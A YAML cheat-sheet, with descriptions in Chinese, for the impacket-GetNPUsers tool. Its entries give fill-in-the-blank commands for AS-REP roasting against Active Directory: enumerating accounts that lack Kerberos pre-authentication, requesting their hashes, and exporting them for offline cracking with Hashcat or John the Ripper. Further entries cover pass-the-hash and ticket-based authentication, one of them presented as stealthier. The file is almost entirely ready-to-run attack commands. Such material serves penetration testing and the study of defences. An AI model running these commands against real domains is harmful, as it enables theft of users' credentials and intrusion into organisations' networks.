tool: impacket-GetNPUsers
tags: [active-directory, kerberos, as-rep-roasting, pentest, enumeration, security, exploitation]

actions:
  # === ENUMERATION AND DISCOVERY ===
  - title: impacket-GetNPUsers - 从文件列出易受攻击用户
    desc: |
      遍历用户名列表，识别不需要 Kerberos 预认证的账户。
      这是 Active Directory 环境中寻找 AS-REP roasting 目标的关键侦察步骤。
      如果发现某用户禁用了预认证，就可在不知道其密码的情况下请求其 TGT。
    command: "impacket-GetNPUsers {{domain}}/ -usersfile {{users_file}} -dc-ip {{dc_ip}}"

  - title: impacket-GetNPUsers - 查询特定用户的预认证状态
    desc: |
      检查某个已知用户名是否设置了“不要求 Kerberos 预认证”属性。
      当你拥有高价值目标账户并想确认其是否易受 AS-REP roasting 攻击时使用。
      除非添加 -request 标志，否则此命令不会请求哈希，因此噪声较小。
    command: "impacket-GetNPUsers {{domain}}/{{username}} -dc-ip {{dc_ip}}"

  # === EXPLOITATION (AS-REP ROASTING) ===
  - title: impacket-GetNPUsers - 请求并输出哈希用于破解
    desc: |
      为未启用预认证的用户请求 AS-REP（认证服务响应）并输出可破解的哈希。
      输出默认显示在终端中，并已格式化为可供离线破解工具使用。
      这是执行 AS-REP roasting 攻击以获取用户凭据的主要方法。
    command: "impacket-GetNPUsers {{domain}}/ -usersfile {{users_file}} -request -dc-ip {{dc_ip}}"

  - title: impacket-GetNPUsers - 将哈希导出到文件供 Hashcat 使用
    desc: |
      为易受攻击的用户请求 TGT，并将生成的哈希保存到专门为 Hashcat 格式化的文件中。
      Hashcat 默认格式（模式 18200）可直接用于离线暴力破解或字典攻击。
      请确保输出文件所在目录具有写入权限。
    command: "impacket-GetNPUsers {{domain}}/ -usersfile {{users_file}} -request -format hashcat -outputfile {{output_file|hashes.txt}} -dc-ip {{dc_ip}}"

  - title: impacket-GetNPUsers - 为 John the Ripper 导出哈希
    desc: |
      收集 AS-REP 哈希并以与 John the Ripper 兼容的格式保存。
      当你的破解流程使用 JtR 而非 Hashcat 时很有用。
      该命令针对所提供列表中的所有用户，并处理与域控制器的通信。
    command: "impacket-GetNPUsers {{domain}}/ -usersfile {{users_file}} -request -format john -outputfile {{output_file|hashes.jtr}} -dc-ip {{dc_ip}}"

  # === AUTHENTICATED QUERIES ===
  - title: impacket-GetNPUsers - 使用 NTLM 哈希认证
    desc: |
      使用特定用户的 NTLM 哈希而非明文密码进行认证以执行查询。
      在拥有域用户哈希并想枚举其他账户的“Pass-the-Hash”场景中很有用。
      注意某些环境可能需要有效认证才能查询目录中的这些属性。
    command: "impacket-GetNPUsers {{domain}}/{{username}} -hashes {{hash}} -request -dc-ip {{dc_ip}}"

  - title: impacket-GetNPUsers - 使用 Kerberos 票据（ccache）认证
    desc: |
      使用 ccache 文件中已有的 Kerberos 票据授予票据（TGT）向 DC 认证请求。
      -k 标志表示使用 Kerberos，-no-pass 防止工具提示输入密码。
      这是一种更隐蔽的方法，可避免 NTLM 认证并利用现有有效会话。
    command: "impacket-GetNPUsers {{domain}}/{{username}} -k -no-pass -dc-ip {{dc_ip}}"

  # === ADVANCED OPTIONS ===
  - title: impacket-GetNPUsers - 使用调试模式排查
    desc: |
      以详细调试输出运行工具，帮助诊断连接或认证问题。
      在排查 RPC 错误、时钟偏差或与域控制器的连接问题时尤为有用。
      它提供底层 Impacket 库调用和 Kerberos 交互的详细信息。
    command: "impacket-GetNPUsers {{domain}}/{{username}} -request -debug -dc-ip {{dc_ip}}"

  - title: impacket-GetNPUsers - 指定 DC 主机名
    desc: |
      使用主机名而非仅 IP 将请求定向到特定的域控制器。
      在 Kerberos 严格性要求 SPN 与目标主机名匹配的环境中可能是必需的。
      如果省略，工具通常会尝试将域名解析为 IP 地址。
    command: "impacket-GetNPUsers {{domain}}/ -usersfile {{users_file}} -request -dc-host {{dc_hostname}} -dc-ip {{dc_ip}}"